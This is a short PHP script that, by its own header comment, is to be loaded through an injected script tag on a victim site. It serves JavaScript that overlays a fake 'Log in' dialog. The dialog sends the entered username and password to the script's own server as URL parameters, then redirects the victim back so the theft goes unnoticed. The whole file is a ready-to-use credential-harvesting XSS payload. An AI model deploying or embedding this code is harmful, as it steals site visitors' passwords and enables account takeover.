<?php
/*
 Call this script from an injected <script> tag to pop up a modal dialog prompting for username and password which will send back creds to the same script
*/
if( isset( $_GET["username"] ) ){
	if( isset( $_SERVER['HTTP_REFERER'] ) ){
		header( "Location: ".$_SERVER['HTTP_REFERER'] );
	}else{
		echo "<script>window.history.back();</script>";
	}
	exit;
}
header( "Content-type: text/javascript" );
if( isset( $_SERVER['HTTPS'] ) && $_SERVER['HTTPS'] ){
    $self = "https://";
}else{
    $self = "http://";
}
$self .= $_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'];
$html = "
<style>
#login_modal_fade {
    position: absolute;
    width: 100%;
    height: 100%;
    top: 0;
    left: 0;
    background: black;
    opacity: 0.9;
}
#login_modal_container {
    position: absolute;
    top: 20%;
    left: 30%;
    width: 30%;
    background: white;
    padding: 0 1em;
    border: 1px solid black;
    border-radius: 5px;
}
#login_modal_container label {
    width: 20%;
}
</style>
<div id='login_modal_fade'></div>
<div id='login_modal_container'>
<form method='get' action='$self'>
    <h2>Log in</h2>
    <div class='field'><label>Username: </label><input type='text' name='username'></div>
    <div class='field'><label>Password: </label><input type='password' name='password'></div>
    <div class='buttons'><input type='submit' value='Log in'></div>
</form>
</div>";
$html = preg_replace( "/[\n\r]/", "", $html ); 
echo "document.body.innerHTML += \"$html\";";
?>
